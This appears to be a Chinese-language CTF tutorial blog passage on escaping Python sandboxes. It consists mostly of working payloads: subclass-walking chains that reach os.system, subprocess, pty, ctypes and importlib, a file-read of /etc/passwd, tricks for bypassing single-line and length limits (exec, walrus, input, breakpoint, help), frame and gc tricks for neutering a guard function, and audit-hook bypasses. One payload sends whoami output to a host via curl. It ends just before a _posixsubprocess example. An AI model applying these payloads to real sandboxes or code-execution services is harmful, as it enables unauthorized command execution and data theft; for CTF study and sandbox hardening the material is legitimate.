<p><strong>rce</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess </span></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># builtins</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># help</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;help&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>File</strong></p>
<p>操作文件可以使用 builtins 中的 open，也可以使用 FileLoader 模块的 get_data 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;FileLoader&quot; ][0].get_data(0,&quot;/etc/passwd&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="绕过多行限制"><a href="#绕过多行限制" class="headerlink" title="绕过多行限制"></a>绕过多行限制</h4><p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用，例如<strong>eval，中间如果存在<code>;</code>或者换行会报错</strong>。</p>
<h5 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h5><p>exec可以支持换行符与<code>;</code>，如下代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;exec(&#x27;import os; os.system(\&quot;whoami\&quot;)&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="compile-1"><a href="#compile-1" class="headerlink" title="compile"></a>compile</h5><p>这个也是之前提过的，使用这个函数后就也可以执行多行代码，如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="海象表达式"><a href="#海象表达式" class="headerlink" title="海象表达式"></a>海象表达式</h5><p>海象表达式是<u>Python 3.8</u>引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</p>
<p>海象表达式的语法形式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;expression&gt; := &lt;value&gt; if &lt;condition&gt; else &lt;value&gt;</span><br></pre></td></tr></table></figure>

<p>借助海象表达式，我们可以通过列表来替代多行代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;dir&quot;)]&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h4><h5 id="打开输入流"><a href="#打开输入流" class="headerlink" title="打开输入流"></a>打开输入流</h5><h6 id="input-函数"><a href="#input-函数" class="headerlink" title="input()函数"></a>input()函数</h6><p>如果沙箱内执行的内容是通过input 进行传入的话，可以传入input打开一个新的输入流，然后再输入最终的payload（如<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>），这样可以绕过所有的防护。</p>
<p><strong>但是需要注意</strong>，一般题目只会在外面套一层<code>eval()</code>,这样只会执行<code>input()</code>，为了能够执行我们任意输入的代码，<strong>可以这样传参进去：<code>eval(input)</code>，</strong>这样才能成功执行类似<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>这样的代码。</p>
<p>但是在no builtins 的环境或者题目需要以Http请求的方式传入进行输入时，这种方法就失效了。</p>
<p><strong>如果<code>input()</code>被禁止了，那么还可以尝试下面的其他的输入流方式</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">下面的方法都需要有sys模块</span><br><span class="line"></span><br><span class="line">（1）sys.stdin.read() 注意输入完毕之后（也许要先enter一下--本地在解释器上尝试的）按 ctrl+d 结束输入 。</span><br><span class="line"></span><br><span class="line">（2）sys.stdin.readline()  </span><br><span class="line"></span><br><span class="line">（3）eval(sys.stdin.readlines()[0]) 这个注意的地方和`(1)`一样，同时注意sys.stdin.readlines() 获得的结果是一个列表</span><br></pre></td></tr></table></figure>



<h6 id="breakpoint-函数"><a href="#breakpoint-函数" class="headerlink" title="breakpoint 函数"></a>breakpoint 函数</h6><p>前面说过这个函数，pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，<strong>以及在任何堆栈帧的上下文中运行任意 Python 代码</strong>。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">0</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br></pre></td></tr></table></figure>

<h6 id="help-函数"><a href="#help-函数" class="headerlink" title="help 函数"></a>help 函数</h6><p>也是之前说过的，直接给用法（按顺序输入）：<br>help() &#x3D;&#x3D;&gt; os &#x3D;&#x3D;&gt;!ls(或者!sh进入交互式)</p>
<h4 id="变量覆盖与函数篡改"><a href="#变量覆盖与函数篡改" class="headerlink" title="变量覆盖与函数篡改"></a>变量覆盖与函数篡改</h4><p>在Python中，sys模块提供了许多与Python解释器和其环境交互的功能，包括对全局变量和函数的操作。<strong>在沙箱中获取sys模块就可以达到变量覆盖与函数篡改的目的。</strong></p>
<p><code>sys.modules</code>存放了现有模块的引用，通过**访问<code>sys.modules[&#39;__main__&#39;]</code>**就可以访问到当前模块定义的所有函数以及全局变量。可通过如下代码查看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 <code>__builtins__</code>篡改内置函数等,这只是一个思路.</p>
<p>总体来说,只要获取了某个函数或者变量就可以篡改, 难点就在于获取.</p>
<h5 id="利用-gc-获取已删除模块"><a href="#利用-gc-获取已删除模块" class="headerlink" title="利用 gc 获取已删除模块"></a>利用 gc 获取已删除模块</h5><p>思路来源于 <a target="_blank" rel="noopener" href="https://github.com/fab1ano/hxp-ctf-20/tree/master/audited">writeup by fab1ano – github</a>（有docker）</p>
<p>这道题的目标是覆盖<code>__main__</code>中的<code>__exit</code>函数，但是题目将<code>sys.modules[&#39;__main__&#39;]</code>删除了，无法直接获取。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br></pre></td></tr></table></figure>

<p><code>gc</code>是Python的内置模块，全名为”garbage collector”，中文译为垃圾回收，**<code>gc</code>模块主要的功能是提供一个接口公开发者直接与Python的垃圾回收机制进行交互。**</p>
<p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。<code>gc</code> 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p>
<p>下面是一些 <code>gc</code> 模块中的主要函数：</p>
<ol>
<li><code>gc.collect(generation=2)</code>：这个函数会立即触发一次垃圾回收。你可以通过 <code>generation</code> 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</li>
<li><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</li>
<li><code>gc.get_referrers(*objs)</code>：这个函数会返回指向 <code>objs</code> 中任何一个对象的对象列表。</li>
</ol>
<p>exp 如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> gc.get_objects():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__name__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(obj):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;__main__&#x27;</span> <span class="keyword">in</span> obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module __main__&#x27;</span>)</span><br><span class="line">            mod_main = obj</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> == obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module os&#x27;</span>)</span><br><span class="line">            mod_os = obj</span><br><span class="line">mod_main.__exit = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&quot;[+] bypass&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.</p>
<h5 id="利用traceback-获取模块"><a href="#利用traceback-获取模块" class="headerlink" title="利用traceback 获取模块"></a>利用traceback 获取模块</h5><p>主动抛出异常，并获取其后要执行的代码，然后将<code>__exit</code>进行替换，思路巧妙。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    _, _, tb = sys.exc_info()</span><br><span class="line">    nxt_frame = tb.tb_frame</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Walk up stack frames until we find one which</span></span><br><span class="line">    <span class="comment"># has a reference to the audit function</span></span><br><span class="line">    <span class="keyword">while</span> nxt_frame:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;audit&#x27;</span> <span class="keyword">in</span> nxt_frame.f_globals:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        nxt_frame = nxt_frame.f_back</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Neuter the __exit function</span></span><br><span class="line">    nxt_frame.f_globals[<span class="string">&#x27;__exit&#x27;</span>] = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Now we&#x27;re free to call whatever we want</span></span><br><span class="line">    os.system(<span class="string">&#x27;cat /flag*&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>使用 python 3.11 发现 <code>nxt_frame = tb.tb_frame</code> 会触发 <code>object.__getattr__</code> hook. 不同的版本中触发 hook 的地方会有差异,这个 payload 可能仅在 python 3.9 (题目版本)中适用</p>
<h4 id="绕过-audit-hook"><a href="#绕过-audit-hook" class="headerlink" title="绕过 audit hook"></a>绕过 audit hook</h4><p>Python 的审计事件包括一系列可能影响到Python程序运行安全性的重要操作。这些事件的种类及名称不同版本的Python解释器有所不同，且可能随着Python解释器的更新而变动。</p>
<p>Python 中的审计事件包括但不限于以下几类：</p>
<ul>
<li><code>import</code>：发生在导入模块时。</li>
<li><code>open</code>：发生在打开文件时。</li>
<li><code>write</code>：发生在写入文件时。</li>
<li><code>exec</code>：发生在执行Python代码时。</li>
<li><code>compile</code>：发生在编译Python代码时。</li>
<li><code>socket</code>：发生在创建或使用网络套接字时。</li>
<li><code>os.system</code>，<code>os.popen</code>等：发生在执行操作系统命令时。</li>
<li><code>subprocess.Popen</code>，<code>subprocess.run</code>等：发生在启动子进程时。</li>
</ul>
<p>比如calc_jail_beginner_level6 这道题，使用了 audithook 构建沙箱,采用白名单来进行限制.audit hook 属于 python 底层的实现,因此常规的变换根本无法绕过.</p>
<p>部分题目源码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  sys.addaudithook(my_audit_hook)</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>

<p>这里设置了白名单，使用import导入其他函数以及常规的命令执行方法都是会触发audithook，就需要有其他绕过。</p>
<h6 id="loader-load-module导入模块"><a href="#loader-load-module导入模块" class="headerlink" title="__loader__.load_module导入模块"></a><code>__loader__.load_module</code>导入模块</h6><p><code>__loader__.load_module(fullname)</code>也是python中用于导入模块的一个方法并且不需要导入其他任何库。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;os&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>某些情况下也许可以使用。</p>
<p><code>__loader__</code> 实际上指向的是 <code>_frozen_importlib.BuiltinImporter</code> 类,也可以通过别的方式进行获取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>].__name__</span><br><span class="line"><span class="string">&#x27;BuiltinImporter&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__][<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><code>__loader__.load_module</code> 也有一个缺点就是无法导入非内建模块. 例如 socket</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__.load_module(<span class="string">&#x27;socket&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">290</span>, <span class="keyword">in</span> _load_module_shim</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">721</span>, <span class="keyword">in</span> _load</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">676</span>, <span class="keyword">in</span> _load_unlocked</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">573</span>, <span class="keyword">in</span> module_from_spec</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">776</span>, <span class="keyword">in</span> create_module</span><br><span class="line">ImportError: <span class="string">&#x27;socket&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> a built-<span class="keyword">in</span> module</span><br></pre></td></tr></table></figure>



<h6 id="posixsubprocess-执行命令"><a href="#posixsubprocess-执行命令" class="headerlink" title="_posixsubprocess 执行命令"></a>_posixsubprocess 执行命令</h6><p><code>_posixsubprocess</code> 模块是Python的内部模块，提供了一个用于在UNIX平台上创建子进程的低级别接口。<code>subprocess</code> 模块的实现就用到了<code>_posixsubprocess</code></p>
<p><strong>该模块的核心功能是 fork_exec 函数</strong>，fork_exec 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,每个版本的 Python 可能有所差异.</p>
<p>下面是一个最小化示例:</p>
